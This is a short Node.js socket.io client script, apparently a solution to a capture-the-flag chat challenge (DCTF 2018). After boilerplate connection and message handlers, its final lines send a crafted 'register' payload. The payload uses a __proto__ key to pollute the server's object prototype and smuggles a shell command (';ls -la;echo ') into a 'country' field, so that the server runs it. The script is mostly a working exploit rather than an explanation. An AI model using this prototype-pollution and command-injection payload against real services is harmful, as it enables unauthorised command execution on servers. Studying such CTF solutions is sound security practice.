const io = require('socket.io-client')
//const socket = io.connect('https://chat.dctfq18.def.camp')
const socket = io.connect('http://localhost:3000')

if(process.argv.length != 4) {
  console.log('name and channel missing')
   process.exit()
}

var inputUser = {
  name: process.argv[2]
};

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

//socket.emit('register', JSON.stringify(inputUser));
//socket.emit('message', JSON.stringify({ msg: "hello" }));
//socket.emit('join', process.argv[3]);//ps: you should keep your channels private

socket.emit('register', '{"name":"kevin", "__proto__":{"country":"\';ls -la;echo \'lala"}}');
socket.emit('join', process.argv[3]);//ps: you should keep your channels private
